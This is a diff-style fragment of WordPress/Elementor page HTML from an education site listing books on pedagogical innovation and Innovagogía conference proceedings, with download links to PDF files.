+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3bcc62f" data-id="3bcc62f" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-c8ffbfd elementor-widget elementor-widget-image" data-id="c8ffbfd" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img loading="lazy" decoding="async" width="800" height="446" src="https://www.innovagogia.es/wp-content/uploads/2025/06/realidad-virtual.jpg" class="attachment-large size-large wp-image-324" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/06/realidad-virtual.jpg 950w, https://www.innovagogia.es/wp-content/uploads/2025/06/realidad-virtual-600x335.jpg 600w, https://www.innovagogia.es/wp-content/uploads/2025/06/realidad-virtual-300x167.jpg 300w, https://www.innovagogia.es/wp-content/uploads/2025/06/realidad-virtual-768x428.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-23be6da elementor-widget elementor-widget-image" data-id="23be6da" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="537" height="537" src="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png" class="attachment-large size-large wp-image-202" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png 537w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-300x300.png 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-100x100.png 100w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-150x150.png 150w" sizes="(max-width: 537px) 100vw, 537px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-2232919 elementor-widget elementor-widget-heading" data-id="2232919" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Educar para transformar. Innovación pedagógica, calidad y TIC en contextos formativos</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-7601eee elementor-widget elementor-widget-text-editor" data-id="7601eee" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Este volumen ofrece una reflexión práctica sobre cómo la innovación puede elevar la calidad formativa y fomentar una transformación educativa inclusiva y orientada al cambio social.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-11aa928 elementor-widget elementor-widget-button" data-id="11aa928" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1a0phtoH0cNF4q_qNGMFBXVgRT5KNP6Cw/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-680da29 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="680da29" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-d59f330" data-id="d59f330" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-91a4a70 elementor-widget elementor-widget-image" data-id="91a4a70" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img loading="lazy" decoding="async" width="800" height="446" src="https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo2_innovagogia.jpg" class="attachment-large size-large wp-image-260" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo2_innovagogia.jpg 950w, https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo2_innovagogia-600x335.jpg 600w, https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo2_innovagogia-300x167.jpg 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo2_innovagogia-768x428.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-ad146e5 elementor-widget elementor-widget-image" data-id="ad146e5" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="537" height="537" src="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png" class="attachment-large size-large wp-image-202" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png 537w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-300x300.png 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-100x100.png 100w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-150x150.png 150w" sizes="(max-width: 537px) 100vw, 537px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-20acd03 elementor-widget elementor-widget-heading" data-id="20acd03" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default"><a href="https://octaedro.com/wp-content/uploads/2021/01/16232-9788418348228.pdf" target="_blank">Claves para la innovación pedagógica ante los nuevos retos. Respuestas en la vanguardia de la práctica educativa</a></h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-4f89938 elementor-widget elementor-widget-text-editor" data-id="4f89938" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Este libro es una nueva entrega de la producción científica impulsada por el Colectivo Docente Internacional Innovagogía que se publica bajo el sello de la prestigiosa Editorial Octaedro.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-fa63e52 elementor-widget elementor-widget-button" data-id="fa63e52" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://octaedro.com/wp-content/uploads/2021/01/16232-9788418348228.pdf" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-6facb3b" data-id="6facb3b" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-b0249c4 elementor-widget elementor-widget-image" data-id="b0249c4" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img loading="lazy" decoding="async" width="800" height="446" src="https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo_innovacionEducativa.jpg" class="attachment-large size-large wp-image-193" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo_innovacionEducativa.jpg 950w, https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo_innovacionEducativa-600x335.jpg 600w, https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo_innovacionEducativa-300x167.jpg 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/Ejemplo_innovacionEducativa-768x428.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-02c1c9b elementor-widget elementor-widget-image" data-id="02c1c9b" data-element_type="widget" data-widget_type="image.default">
+				<div class="elementor-widget-container">
+															<img decoding="async" width="537" height="537" src="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png" class="attachment-large size-large wp-image-202" alt="" srcset="https://www.innovagogia.es/wp-content/uploads/2025/04/book-1.png 537w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-300x300.png 300w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-100x100.png 100w, https://www.innovagogia.es/wp-content/uploads/2025/04/book-1-150x150.png 150w" sizes="(max-width: 537px) 100vw, 537px" />															</div>
+				</div>
+				<div class="elementor-element elementor-element-c4981ce elementor-widget elementor-widget-heading" data-id="c4981ce" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default"><a href="https://drive.google.com/file/d/1r5dkXZorwqgj0mzfg3-8qLLA75NUNOd8/view" target="_blank">Experiencias pedagógicas e innovación educativa. Aportaciones desde la praxis docente e investigadora</a></h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-beea3ef elementor-widget elementor-widget-text-editor" data-id="beea3ef" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Este libro, con casi 4.000 páginas, recoge las principales aportaciones al “IV Congreso Internacional Virtual sobre Innovación Pedagógica y Praxis Educativa-Innovagogía 2018”.</p>								</div>
+				</div>
+				<div class="elementor-element elementor-element-1f4a82c elementor-widget elementor-widget-button" data-id="1f4a82c" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1r5dkXZorwqgj0mzfg3-8qLLA75NUNOd8/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-4f61a95 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-invisible" data-id="4f61a95" data-element_type="section" data-settings="{&quot;animation&quot;:&quot;fadeInUp&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-d0130dd" data-id="d0130dd" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-0462893 elementor-widget elementor-widget-heading" data-id="0462893" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h3 class="elementor-heading-title elementor-size-default">Libros de actas</h3>				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-253b672 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-invisible" data-id="253b672" data-element_type="section" data-settings="{&quot;animation&quot;:&quot;fadeInUp&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-524b8b8" data-id="524b8b8" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-4130b46 elementor-arrows-position-outside elementor-pagination-type-bullets elementor-pagination-position-outside elementor-widget elementor-widget-n-carousel" data-id="4130b46" data-element_type="widget" data-settings="{&quot;carousel_items&quot;:[{&quot;slide_title&quot;:&quot;2022&quot;,&quot;_id&quot;:&quot;011f872&quot;},{&quot;slide_title&quot;:&quot;2020&quot;,&quot;_id&quot;:&quot;6fe55e1&quot;},{&quot;slide_title&quot;:&quot;2018&quot;,&quot;_id&quot;:&quot;ce5e655&quot;},{&quot;slide_title&quot;:&quot;2016&quot;,&quot;_id&quot;:&quot;72173f6&quot;},{&quot;slide_title&quot;:&quot;2014&quot;,&quot;_id&quot;:&quot;5b4608f&quot;},{&quot;slide_title&quot;:&quot;2012&quot;,&quot;_id&quot;:&quot;16cabed&quot;}],&quot;image_spacing_custom&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:20,&quot;sizes&quot;:[]},&quot;slides_to_show_tablet&quot;:&quot;2&quot;,&quot;slides_to_show_mobile&quot;:&quot;1&quot;,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;infinite&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;offset_sides&quot;:&quot;none&quot;,&quot;arrows&quot;:&quot;yes&quot;,&quot;pagination&quot;:&quot;bullets&quot;,&quot;image_spacing_custom_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;image_spacing_custom_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="nested-carousel.default">
+				<div class="elementor-widget-container">
+							<div class="e-n-carousel swiper" role="region" aria-roledescription="carousel" aria-label="Carousel" dir="ltr">
+			<div class="swiper-wrapper" aria-live="off">
+										<div class="swiper-slide" data-slide="1" role="group" aria-roledescription="slide" aria-label="1 of 6">
+							<div class="elementor-element elementor-element-4a991cb e-flex e-con-boxed e-con e-child" data-id="4a991cb" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-a183415 e-con-full e-flex e-con e-child" data-id="a183415" data-element_type="container">
+				<div class="elementor-element elementor-element-d820d66 elementor-view-default elementor-widget elementor-widget-icon" data-id="d820d66" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-7e7dd60 elementor-widget elementor-widget-heading" data-id="7e7dd60" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovagogía 2022</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-8a4a7c5 elementor-widget elementor-widget-button" data-id="8a4a7c5" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1JBfTwIZ4255Khs9qKWvUQDNBKGQSprFS/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+								</div>
+											<div class="swiper-slide" data-slide="2" role="group" aria-roledescription="slide" aria-label="2 of 6">
+							<div class="elementor-element elementor-element-b688d68 e-flex e-con-boxed e-con e-child" data-id="b688d68" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-dce763c e-con-full e-flex e-con e-child" data-id="dce763c" data-element_type="container">
+				<div class="elementor-element elementor-element-103cecf elementor-view-default elementor-widget elementor-widget-icon" data-id="103cecf" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-ff82186 elementor-widget elementor-widget-heading" data-id="ff82186" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h4 class="elementor-heading-title elementor-size-default">Innovagogía 2020</h4>				</div>
+				</div>
+				<div class="elementor-element elementor-element-4368c15 elementor-widget elementor-widget-button" data-id="4368c15" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="https://drive.google.com/file/d/1OXSVKQJa7MFODERRP9HCNIMK-Pt0EJUk/view" target="_blank">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<svg aria-hidden="true" class="e-font-icon-svg e-far-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm250.2-143.7c-12.2-12-47-8.7-64.4-6.5-17.2-10.5-28.7-25-36.8-46.3 3.9-16.1 10.1-40.6 5.4-56-4.2-26.2-37.8-23.6-42.6-5.9-4.4 16.1-.4 38.5 7 67.1-10 23.9-24.9 56-35.4 74.4-20 10.3-47 26.2-51 46.2-3.3 15.8 26 55.2 76.1-31.2 22.4-7.4 46.8-16.5 68.4-20.1 18.9 10.2 41 17 55.8 17 25.5 0 28-28.2 17.5-38.7zm-198.1 77.8c5.1-13.7 24.5-29.5 30.4-35-19 30.3-30.4 35.7-30.4 35zm81.6-190.6c7.4 0 6.7 32.1 1.8 40.8-4.4-13.9-4.3-40.8-1.8-40.8zm-24.4 136.6c9.7-16.9 18-37 24.7-54.7 8.3 15.1 18.9 27.2 30.1 35.5-20.8 4.3-38.9 13.1-54.8 19.2zm131.6-5s-5 6-37.3-7.8c35.1-2.6 40.9 5.4 37.3 7.8z"></path></svg>			</span>
+									<span class="elementor-button-text">Descargar</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+								</div>
+											<div class="swiper-slide" data-slide="3" role="group" aria-roledescription="slide" aria-label="3 of 6">
+							<div class="elementor-element elementor-element-dcb2bac e-flex e-con-boxed e-con e-child" data-id="dcb2bac" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-af9d0c6 e-con-full e-flex e-con e-child" data-id="af9d0c6" data-element_type="container">
+				<div class="elementor-element elementor-element-6439ac2 elementor-view-default elementor-widget elementor-widget-icon" data-id="6439ac2" data-element_type="widget" data-widget_type="icon.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-icon-wrapper">
+			<div class="elementor-icon">
+			<svg aria-hidden="true" class="e-font-icon-svg e-fas-file-pdf" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg"><path d="M181.9 256.1c-5-16-4.9-46.9-2-46.9 8.4 0 7.6 36.9 2 46.9zm-1.7 47.2c-7.7 20.2-17.3 43.3-28.4 62.7 18.3-7 39-17.2 62.9-21.9-12.7-9.6-24.9-23.4-34.5-40.8zM86.1 428.1c0 .8 13.2-5.4 34.9-40.2-6.7 6.3-29.1 24.5-34.9 40.2zM248 160h136v328c0 13.3-10.7 24-24 24H24c-13.3 0-24-10.7-24-24V24C0 10.7 10.7 0 24 0h200v136c0 13.2 10.8 24 24 24zm-8 171.8c-20-12.2-33.3-29-42.7-53.8 4.5-18.5 11.6-46.6 6.2-64.2-4.7-29.4-42.4-26.5-47.8-6.8-5 18.3-.4 44.1 8.1 77-11.6 27.6-28.7 64.6-40.8 85.8-.1 0-.1.1-.2.1-27.1 13.9-73.6 44.5-54.5 68 5.6 6.9 16 10 21.5 10 17.9 0 35.7-18 61.1-61.8 25.8-8.5 54.1-19.1 79-23.2 21.7 11.8 47.1 19.5 64 19.5 29.2 0 31.2-32 19.7-43.4-13.9-13.6-54.3-9.7-73.6-7.2zM377 105L279 7c-4.5-4.5-10.6-7-17-7h-6v128h128v-6.1c0-6.3-2.5-12.4-7-16.9zm-74.1 255.3c4.1-2.7-2.5-11.9-42.8-9 37.1 15.8 42.8 9 42.8 9z"></path></svg>			</div>
+		</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-fab9ca6 elementor-widget elementor-widget-heading" data-id="fab9ca6" data-element_type="widget" data-widget_type="heading.default">
